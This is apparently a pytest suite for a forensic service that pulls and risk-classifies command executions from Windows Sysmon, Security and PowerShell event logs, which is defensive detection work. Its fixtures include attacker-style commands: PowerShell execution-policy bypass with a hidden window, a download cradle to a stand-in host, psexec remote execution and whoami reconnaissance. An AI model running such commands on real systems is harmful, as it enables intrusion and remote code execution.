from __future__ import annotations

from app.services import command_history


def _event(event_id: int, **overrides):
    base = {
        "id": f"event-{event_id}",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "@timestamp": "2024-03-22T12:00:00Z",
        "host": {"name": "hosta.examplecorp.local"},
        "user": {"name": "EXAMPLECORP\\usera"},
        "windows": {"event_id": event_id},
        "event": {"provider": "Microsoft-Windows-Sysmon", "channel": "Microsoft-Windows-Sysmon/Operational"},
        "artifact": {"type": "windows_event", "parser": "evtxecmd_csv"},
        "source_file": "Sysmon.evtx",
    }
    base.update(overrides)
    return base


def test_sysmon_event_id_1_extracts_command_execution() -> None:
    items = command_history._commands_from_event(
        "case-1",
        _event(
            1,
            process={
                "name": "powershell.exe",
                "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -ep bypass -File C:\\Users\\Public\\maintenance.ps1",
                "guid": "{PROC-1}",
                "pid": 4444,
                "parent": {"name": "explorer.exe", "command_line": "explorer.exe"},
            },
        ),
    )

    assert len(items) == 1
    item = items[0]
    assert item["source_type"] == "sysmon_1"
    assert item["shell"] == "powershell"
    assert item["shell_family"] == "powershell"
    assert item["launcher"] == "powershell.exe"
    assert item["classification_confidence"] == "high"
    assert "maintenance.ps1" in item["command"]
    assert item["confidence"] == "high"
    assert "PowerShell execution policy bypass" in item["risk_reasons"]


def test_security_4688_extracts_command_execution() -> None:
    items = command_history._commands_from_event(
        "case-1",
        _event(
            4688,
            event={"provider": "Microsoft-Windows-Security-Auditing", "channel": "Security"},
            process={"name": "cmd.exe", "command_line": "cmd.exe /c whoami", "pid": 1234},
        ),
    )

    assert items[0]["source_type"] == "security_4688"
    assert items[0]["shell"] == "cmd"
    assert items[0]["shell_family"] == "cmd"
    assert items[0]["launcher"] == "cmd.exe"
    assert items[0]["command"] == "cmd.exe /c whoami"
    assert "reconnaissance command" in items[0]["risk_reasons"]


def test_powershell_4104_extracts_script_block() -> None:
    items = command_history._commands_from_event(
        "case-1",
        _event(
            4104,
            event={"provider": "Microsoft-Windows-PowerShell", "channel": "Microsoft-Windows-PowerShell/Operational"},
            powershell={"command": "Invoke-WebRequest http://example-control.test/maintenance.ps1"},
        ),
    )

    assert items[0]["source_type"] == "powershell_operational"
    assert items[0]["shell"] == "powershell"
    assert items[0]["shell_family"] == "powershell"
    assert "download cradle or file transfer utility" in items[0]["risk_reasons"]
    assert "Synthetic indicator" in items[0]["risk_reasons"]


def test_powershell_placeholder_command_falls_back_to_host_application_payload() -> None:
    payload = (
        "Level = Informational, HostName = ConsoleHost, "
        "HostApplication = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
        "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "
        "C:\\Users\\analyst\\Documents\\KaironLab01\\run_key_payload.ps1, "
        "EngineVersion = 5.1, Command Name = run_key_payload.ps1, "
        "User = KAIRON-LAB01\\analyst, ShellId = Microsoft.PowerShell,"
    )

    items = command_history._commands_from_event(
        "case-1",
        _event(
            4103,
            event={"provider": "Microsoft-Windows-PowerShell", "channel": "Microsoft-Windows-PowerShell/Operational"},
            artifact={"type": "powershell", "parser": "powershell_evtx"},
            process={"name": "powershell.exe", "command_line": "0x0", "pid": 8288},
            user={"name": payload},
            windows={
                "event_id": 4103,
                "event_data": {
                        "UserId": "KAIRON-LAB01\\analyst",
                    "payload_columns": {
                        "PayloadData1": f"Command Name: {payload}",
                        "PayloadData2": f"Host Application = {payload}",
                        "PayloadData6": 'Payload: CommandInvocation(run_key_payload.ps1): "run_key_payload.ps1"',
                        "Payload": "0x0",
                    },
                },
            },
        ),
    )

    assert len(items) == 1
    item = items[0]
    assert "powershell.exe" in item["command"]
    assert "run_key_payload.ps1" in item["command"]
    assert item["process"]["command_line"] == ""
    assert item["user"] == "KAIRON-LAB01\\analyst"
    assert "HostApplication" in item["raw_payload"]
    assert "Command Name" not in item["user"]


def test_powershell_placeholder_command_falls_back_to_script_block() -> None:
    items = command_history._commands_from_event(
        "case-1",
        _event(
            4104,
            event={"provider": "Microsoft-Windows-PowerShell", "channel": "Microsoft-Windows-PowerShell/Operational"},
            artifact={"type": "powershell", "parser": "powershell_evtx"},
            process={"name": "powershell.exe", "command_line": "0x"},
            windows={
                "event_id": 4104,
                "event_data": {
                    "ScriptBlockText": "Write-Host KAIRON-LAB01-MARKER",
                    "User": "KAIRON-LAB01\\analyst",
                },
            },
        ),
    )

    assert items[0]["command"] == "Write-Host KAIRON-LAB01-MARKER"
    assert items[0]["user"] == "KAIRON-LAB01\\analyst"


def test_powershell_json_payload_command_falls_back_to_host_application() -> None:
    raw_json = (
        '{"EventData":{"Data":"Stopped, Available, \\tNewEngineState=Stopped\\n'
        '\\tHostApplication=C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe '
        '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File '
        'C:\\\\Users\\\\analyst\\\\Documents\\\\KaironLab01\\\\run_key_payload.ps1\\n'
        '\\tCommandLine=","Binary":""}}'
    )

    items = command_history._commands_from_event(
        "case-1",
        _event(
            403,
            event={"provider": "Microsoft-Windows-PowerShell", "channel": "Windows PowerShell"},
            artifact={"type": "powershell", "parser": "powershell_evtx"},
            process={"name": "powershell.exe", "command_line": raw_json, "pid": 8288},
            windows={
                "event_id": 403,
                "event_data": {
                    "payload_columns": {
                        "PayloadData1": (
                            "HostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
                            "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "
                            "C:\\Users\\analyst\\Documents\\KaironLab01\\run_key_payload.ps1"
                        ),
                        "Payload": raw_json,
                    },
                },
            },
        ),
    )

    assert len(items) == 1
    assert items[0]["command"].startswith("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
    assert "run_key_payload.ps1" in items[0]["command"]
    assert not items[0]["command"].startswith("{")
    assert items[0]["process"]["command_line"] == ""


def test_dedupes_same_process_guid_and_preserves_supporting_events() -> None:
    first = command_history._commands_from_event(
        "case-1",
        _event(1, id="sysmon", process={"name": "whoami.exe", "command_line": "whoami.exe", "guid": "{GUID-1}"}),
    )[0]
    second = command_history._commands_from_event(
        "case-1",
        _event(
            4688,
            id="security",
            event={"provider": "Microsoft-Windows-Security-Auditing", "channel": "Security"},
            process={"name": "whoami.exe", "command_line": "whoami.exe", "guid": "{GUID-1}"},
        ),
    )[0]

    deduped = command_history._dedupe_commands([second, first])

    assert len(deduped) == 1
    assert deduped[0]["source_type"] == "sysmon_1"
    assert {event["event_id"] for event in deduped[0]["supporting_events"]} == {"sysmon", "security"}


def test_filters_host_alias_risk_and_source_type() -> None:
    item = command_history._commands_from_event(
        "case-1",
        _event(1, process={"name": "powershell.exe", "command_line": "powershell.exe -ep bypass", "guid": "{GUID-1}"}),
    )[0]

    assert command_history._apply_filters([item], {"host": "HOSTA", "risk_min": 30, "source_type": "sysmon_1"})
    assert command_history._apply_filters([item], {"family": "powershell", "launcher": "powershell"})
    assert command_history._apply_filters([item], {"host": "other"}) == []


def test_get_command_history_uses_search_documents(monkeypatch) -> None:
    monkeypatch.setattr(command_history, "get_events_index", lambda case_id: f"events-{case_id}")
    monkeypatch.setattr(
        command_history,
        "search_documents",
        lambda index, body: {
            "hits": {
                "hits": [
                    {
                        "_id": "event-1",
                        "_source": _event(
                            1,
                            id=None,
                            process={"name": "powershell.exe", "command_line": "powershell.exe -ep bypass", "guid": "{GUID-1}"},
                        ),
                    }
                ]
            }
        },
    )

    response = command_history.get_command_history("case-1", {"host": "HOSTA", "page_size": 10})

    assert response["total"] == 1
    assert response["items"][0]["source_type"] == "sysmon_1"
    assert response["facets"]["shell"]["powershell"] == 1
    assert response["facets"]["family"]["powershell"] == 1
    assert response["facets"]["launcher"]["powershell.exe"] == 1


def test_lolbin_remote_exec_discovery_and_prefetch_classification() -> None:
    rundll32 = command_history._commands_from_event(
        "case-1",
        _event(1, process={"name": "rundll32.exe", "command_line": "rundll32.exe shell32.dll,Control_RunDLL", "guid": "{GUID-R}"}),
    )[0]
    psexec = command_history._commands_from_event(
        "case-1",
        _event(1, process={"name": "cmd.exe", "command_line": r"/c C:\Users\public\psexec.exe \\HOSTB -accepteula powershell -ep bypass", "guid": "{GUID-P}"}),
    )[0]
    whoami = command_history._commands_from_event(
        "case-1",
        _event(4688, event={"provider": "Microsoft-Windows-Security-Auditing", "channel": "Security"}, process={"name": "whoami.exe", "command_line": "whoami.exe", "parent": {"name": "cmd.exe"}}),
    )[0]
    prefetch = command_history._commands_from_event(
        "case-1",
        _event(0, artifact={"type": "prefetch", "parser": "pecmd"}, process={"name": "POWERSHELL.EXE"}, key_entity="POWERSHELL.EXE"),
    )[0]

    assert rundll32["shell_family"] == "lolbin"
    assert psexec["shell_family"] == "remote_exec"
    assert whoami["shell_family"] == "binary_execution"
    assert whoami["parent_shell"] == "cmd"
    assert prefetch["launcher"] == "powershell.exe"
    assert prefetch["shell_family"] == "powershell"
    assert prefetch["classification_confidence"] in {"low", "medium"}


def _hit(doc_id: str, *, ts: str, command: str, pid: int) -> dict:
    return {
        "_id": doc_id,
        "_source": {
            "case_id": "case-1",
            "evidence_id": "ev-1",
            "@timestamp": ts,
            "windows": {"event_id": 1},
            "event": {"channel": "Microsoft-Windows-Sysmon/Operational"},
            "artifact": {"type": "windows_event"},
            "host": {"name": "HOSTA"},
            "user": {"name": "usera"},
            "process": {
                "name": "powershell.exe",
                "executable": "powershell.exe",
                "pid": pid,
                "guid": f"guid-{pid}",
                "command_line": command,
                "parent": {"name": "explorer.exe", "pid": 1000},
            },
            "source_file": "Sysmon.evtx",
        },
    }


def test_command_history_timestamp_sort_asc_desc_and_source_doc_id(monkeypatch) -> None:
    hits = [
        _hit("event-new", ts="2024-03-22T12:30:00Z", command="powershell.exe -File C:\\new.ps1", pid=2000),
        _hit("event-old", ts="2024-03-22T12:00:00Z", command="powershell.exe -File C:\\old.ps1", pid=1000),
    ]

    monkeypatch.setattr(command_history, "get_events_index", lambda case_id: f"events-{case_id}")
    monkeypatch.setattr(command_history, "search_documents", lambda *_args, **_kwargs: {"hits": {"hits": hits}})

    asc = command_history.get_command_history("case-1", {"sort_by": "timestamp", "sort_order": "asc", "page_size": 10})
    desc = command_history.get_command_history("case-1", {"sort_by": "timestamp", "sort_order": "desc", "page_size": 10})

    assert asc["sort"] == "timestamp_asc"
    assert asc["sort_order"] == "asc"
    assert [item["source_event_id"] for item in asc["items"]] == ["event-old", "event-new"]
    assert asc["items"][0]["windows_event_id"] == "1"

    assert desc["sort"] == "timestamp_desc"
    assert desc["sort_order"] == "desc"
    assert [item["source_event_id"] for item in desc["items"]] == ["event-new", "event-old"]


def test_command_history_filters_preserve_sort_count(monkeypatch) -> None:
    hits = [
        _hit("event-new", ts="2024-03-22T12:30:00Z", command="powershell.exe -File C:\\new.ps1", pid=2000),
        _hit("event-old", ts="2024-03-22T12:00:00Z", command="cmd.exe /c whoami", pid=1000),
    ]

    monkeypatch.setattr(command_history, "get_events_index", lambda case_id: f"events-{case_id}")
    monkeypatch.setattr(command_history, "search_documents", lambda *_args, **_kwargs: {"hits": {"hits": hits}})

    result = command_history.get_command_history("case-1", {"q": "new.ps1", "sort_by": "timestamp", "sort_order": "desc", "page_size": 10})

    assert result["total"] == 1
    assert result["sort_order"] == "desc"
    assert result["items"][0]["source_event_id"] == "event-new"
    assert "new.ps1" in result["items"][0]["command"]
